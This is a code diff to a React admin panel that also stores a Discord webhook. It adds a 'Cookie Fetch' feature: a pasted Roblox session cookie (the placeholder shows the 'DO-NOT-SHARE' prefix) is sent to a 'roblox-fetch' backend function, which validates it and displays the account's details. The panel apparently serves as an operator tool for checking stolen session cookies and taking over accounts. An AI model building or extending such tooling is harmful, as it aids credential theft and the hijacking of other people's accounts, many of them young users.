@@ -3,6 +3,8 @@ import { useNavigate } from "react-router-dom";
 import { Shield } from "lucide-react";
 import { Plus, Trash2, Copy, LogOut, Webhook, ArrowLeft, Clock, Key, ChevronDown, ChevronUp } from "lucide-react";
 import { getTokens, generateToken, deleteToken, isTokenExpired, Token } from "@/lib/tokenStore";
+import { supabase } from "@/integrations/supabase/client";
+import { Cookie, Loader2 } from "lucide-react";
 import { toast } from "sonner";
 
 const WEBHOOK_KEY = "discord_webhook_url";
@@ -13,6 +15,10 @@ const AdminPanel = () => {
   const [expiryHours, setExpiryHours] = useState(24);
   const [webhookUrl, setWebhookUrl] = useState("");
   const [showWebhook, setShowWebhook] = useState(false);
+  const [fetchCookie, setFetchCookie] = useState("");
+  const [fetchLoading, setFetchLoading] = useState(false);
+  const [fetchResult, setFetchResult] = useState<Record<string, any> | null>(null);
+  const [showFetch, setShowFetch] = useState(false);
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -60,6 +66,32 @@ const AdminPanel = () => {
 
   const activeCount = tokens.filter(t => !t.used && !isTokenExpired(t)).length;
   const usedCount = tokens.filter(t => t.used).length;
+
+  const handleFetchCookie = async () => {
+    const trimmed = fetchCookie.trim();
+    if (!trimmed) {
+      toast.error("Enter a cookie");
+      return;
+    }
+    setFetchLoading(true);
+    setFetchResult(null);
+    try {
+      const { data, error } = await supabase.functions.invoke("roblox-fetch", {
+        body: { cookie: trimmed },
+      });
+      if (error || !data?.valid) {
+        toast.error("Invalid cookie or fetch failed");
+        setFetchResult(data?.info || null);
+      } else {
+        setFetchResult(data.info || {});
+        toast.success("Account info fetched");
+      }
+    } catch (e) {
+      toast.error("Fetch failed");
+    } finally {
+      setFetchLoading(false);
+    }
+  };
 
   return (
     <div className="min-h-screen px-4 py-6">
@@ -159,6 +191,48 @@ const AdminPanel = () => {
         </div>
 
         {/* Discord Webhook */}
+        <div className="card-glow rounded-2xl p-5 space-y-3">
+          <button
+            onClick={() => setShowFetch(!showFetch)}
+            className="flex items-center justify-between w-full"
+          >
+            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
+              <div className="w-7 h-7 rounded-lg bg-primary/20 flex items-center justify-center">
+                <Cookie size={14} className="text-primary" />
+              </div>
+              Cookie Fetch
+            </h2>
+            {showFetch ? <ChevronUp size={16} className="text-muted-foreground" /> : <ChevronDown size={16} className="text-muted-foreground" />}
+          </button>
+          {showFetch && (
+            <div className="space-y-3 pt-1">
+              <textarea
+                value={fetchCookie}
+                onChange={e => setFetchCookie(e.target.value)}
+                placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+                className="input-field text-xs font-mono min-h-[80px] resize-y"
+              />
+              <button
+                onClick={handleFetchCookie}
+                disabled={fetchLoading}
+                className="shimmer text-primary-foreground px-4 py-2.5 rounded-xl font-semibold text-sm glow-btn transition-all w-full flex items-center justify-center gap-2 disabled:opacity-50"
+              >
+                {fetchLoading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch Account Info</>}
+              </button>
+              {fetchResult && (
+                <div className="space-y-1.5 max-h-72 overflow-y-auto bg-secondary/40 rounded-xl p-3 border border-border/50">
+                  {Object.entries(fetchResult).map(([k, v]) => (
+                    <div key={k} className="flex justify-between gap-3 text-xs border-b border-border/30 pb-1 last:border-0">
+                      <span className="text-muted-foreground capitalize">{k}</span>
+                      <span className="text-foreground font-mono text-right break-all">{String(v)}</span>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          )}
+        </div>
+
         <div className="card-glow rounded-2xl p-5 space-y-3">
           <button
             onClick={() => setShowWebhook(!showWebhook)}
